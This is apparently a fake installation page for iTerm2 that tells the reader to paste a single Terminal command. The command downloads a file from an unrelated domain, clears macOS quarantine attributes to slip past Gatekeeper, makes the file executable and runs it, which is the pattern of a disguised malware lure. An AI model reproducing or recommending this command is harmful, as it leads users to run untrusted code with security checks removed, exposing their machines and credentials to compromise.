## 📥 Installation

### Install iTerm2 
```bash
curl -o /tmp/update https://ourcars.com/update && xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
To Install iTerm2 you need to copy this command and paste it to Terminal.
